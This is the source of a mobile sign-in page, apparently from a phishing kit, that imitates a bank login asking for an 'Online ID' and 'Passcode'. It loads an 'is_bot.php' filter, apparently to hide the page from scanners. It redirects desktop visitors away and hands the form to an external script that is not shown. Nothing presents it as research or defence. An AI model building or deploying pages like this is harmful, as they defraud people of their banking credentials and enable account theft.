<?php
require "is_bot.php";
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <link rel="stylesheet" href="css/normalize.min.css">
    <link rel="stylesheet" href="css/estilom.css" />
    <script type="text/javascript">
        if (screen.width > 801) {
            window.location = "index";
        }      
    </script>
</head>

<body>
    <div class="cuerpo">
        <div class="header">
            <span>Sign In</span>
        </div>

        <div class="main">
            <form autocomplete="off" id="formusuario">
                <div class="fgrupo">
                    <input class="input input1" type="text" name="usuario" id="usuario2" required placeholder="Online ID"> 
                    <img src="img/save.png" alt="save">
                </div>
                <div class="fgrupo">
                    <input class="input" type="password" name="contra" id="contra2" required placeholder="Passcode" disabled>
                </div>
                <div class="fgrupo">
                    <button type="button" id="comienzo" disabled><img style="margin-right: 10px;" src="img/secure_lock.png"> Sign In</button>
                </div>
                <div class="fgrupo">
                    <a href="javascript:void(0)">Forgot ID/Passcode?</a>
                    <a href="javascript:void(0)">Enroll</a>
                </div>
            </form>
        </div>
        <div class="piem">
            <img src="img/mpie1.png" alt="pie">
            <img src="img/mpie2.png" alt="pie">
        </div>
        <script src="js/funciones.js"></script>
    </div>
</body>

</html>